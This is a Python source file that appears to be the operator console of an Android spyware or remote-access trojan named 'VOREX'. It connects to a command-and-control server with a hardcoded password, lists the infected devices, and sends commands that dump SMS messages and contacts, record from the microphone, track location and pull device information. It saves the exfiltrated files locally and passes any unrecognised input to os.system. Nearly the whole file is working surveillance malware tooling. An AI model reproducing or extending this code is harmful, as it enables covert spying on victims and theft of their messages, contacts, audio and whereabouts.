import sys
import threading
import time
import requests as r
import os
import ast
#----
server = "http://127.0.0.1:2374"
password = "root"
#----
#os.system("pip install requests")
def cheak_server(server) :
    try :
      req = r.get(server)
      if not req.status_code :
         print(f"server status code : {req.status_code}")
    except :
      print("Error")
def clear() :
    os.system("clear")

def clear_screen():
    # ANSI clear screen + move cursor to top-left
    sys.stdout.write("\033[H\033[J")
    sys.stdout.flush()


def center_text(text, width):
    return text.center(width)


def loading_screen():
    progress = 0
    bar_width = 20
    count = 1
    r.post(f"{server}/reset_all", data=password)
    while count <= 100:
        count = count + 1
        terminal_width = os.get_terminal_size().columns
        terminal_height = os.get_terminal_size().lines

        bar = "█" * progress
        space = " " * (bar_width - progress)

        lines = [
            "Establishing Encrypted Channel...",
            f"[{bar}{space}]",
            "> Syncing with VOREX Ops Center.."
        ]

        clear_screen()

        # Vertical centering
        top_padding = (terminal_height - len(lines)) // 2
        print("\n" * max(0, top_padding))

        # Horizontal centering
        for line in lines:
            print(center_text(line, terminal_width))

        progress += 1

        if progress > bar_width:
            progress = 0

        time.sleep(0.1)

    clear()
    print()
    time.sleep(.5)
    print("\n[INIT] Initializing connected devices...")
    time.sleep(.5)
    print("[INIT] Device scan complete.")
    time.sleep(.5)
    clear()
    print("\n[CONNECTED DEVICES]")
    print("-" * 40)
    req = r.post(f"{server}/devices_status", data=password)
    data = req.text
    data = ast.literal_eval(data)
    id = 0
    device_addr = {}
    for android_id in data :
        id = id + 1
        print(f"[{id}] - {android_id} - {data[android_id]}")
        device_addr[id] = android_id
    select_user(device_addr)
    return device_addr


def get_response(android_id) :
    r.post(f"{server}/clear_response/{android_id}", data=password)
    while True :
          time.sleep(.1)
          req = r.post(f"{server}/get_r/{android_id}", data=password)
          if req.text :
             break
    return req.text


#-------------
# operation
#-------------
def level_two_operation(cmd, android_id) :
    try :
      req = r.post(f"{server}/command/{android_id}/{cmd}", data=password)
      response = get_response(android_id)
      print(f"Response from payload:{response}")
      r2 = r.post(f"{server}/get_f/{android_id}", data=password)
      r3 = r.post(f"{server}/get_fn/{android_id}", data=password)
      with open(f"{r3.text}", "wb") as file :
           file.write(r2.content)
      print(f"[*] file saved as {r3.text}")
    except :
      print("Error")

def level_one_operation(cmd, android_id) :
    try :
      req = r.post(f"{server}/command/{android_id}/{cmd}", data=password)
    except :
      print("Error")
#    print("wait..")
    response = get_response(android_id)
    print(f"Response from payload:{response}")
#end
def select_command(android_id, device_addr) :
    while True :
          print()
          command = input("vorex# ")
          print()
          if command == "dump sms" :
             level_two_operation("3416", android_id)
          elif command == "back" :
             select_user(device_addr)
             break
          elif command == "deviceinfo" :
               level_one_operation("1720",android_id)
          elif command == "help" :
               print("command         Description ")
               print("start micrecord to start micrecord")
          elif command == "start micrecord" :
               level_one_operation("8473", android_id)
          elif command == "stop micrecord" :
               level_two_operation("9263", android_id)
          elif command == "dump contact" :
               level_two_operation("3871", android_id)
          elif command == "torch off" :
               level_one_operation("2432", android_id)
          elif command == "get location" :
               level_one_operation("2592", android_id)
          elif  command == "torch on" :
             req = r.post(f"{server}/command/{android_id}/2713", data=password)
             response = get_response(android_id)
             print(f"Response from payload:{response}")
          else :
             os.system(command)
#    if command == "turch on" :
       


def select_user(device_addr) :
    print()
    id = input("Enter the id(refresh}:")
    #print(device_addr)
    if id :
       select_command(device_addr[int(id)], device_addr)
    else :
       loading_screen()

#loading_thread = threading.Thread(
 #   target=loading_screen
#)

#loading_thread.start()


cheak_server(server)
loading_screen()
#while True:
 #   time.sleep(1)
